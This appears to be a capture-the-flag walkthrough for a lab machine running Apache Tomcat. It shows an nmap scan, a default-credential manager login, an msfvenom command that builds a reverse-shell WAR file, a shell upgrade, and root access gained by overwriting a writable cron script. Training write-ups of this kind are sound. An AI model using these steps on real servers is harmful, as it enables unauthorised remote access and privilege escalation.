
---

### Enumeration

1. Scan all ports to identify services:
    
    ```bash
    nmap -p- -sV -Pn 0.0.0.0
    ```
    
2. Port **8080** is running a web service (Apache Tomcat).
    

---

### Initial Access

1. Access the Tomcat Manager page → credentials `user:password` are valid.
    
2. Upload a malicious WAR file to gain a reverse shell:
    
    ```bash
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f war -o shell.war
    ```
    
3. Deploy `shell.war` via the Tomcat manager and trigger it to receive a shell.
    
4. Upgrade the shell for better interaction:
    
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    

---

### Privilege Escalation

1. Check sudo permissions:
    
    ```bash
    sudo -l
    ```
    
    → No useful entries.
    
2. Inspect cron jobs:
    
    ```bash
    cat /etc/crontab
    ```
    
3. Found writable script execution. Replace with malicious command to copy the root flag:
    
    ```bash
    echo "cp /root/root.txt /home/jack/root.txt" > /home/jack/id.sh
    ```
    

---

### Loot

- Retrieve the flag:
    
    ```bash
    cat /home/jack/root.txt
    ```
    
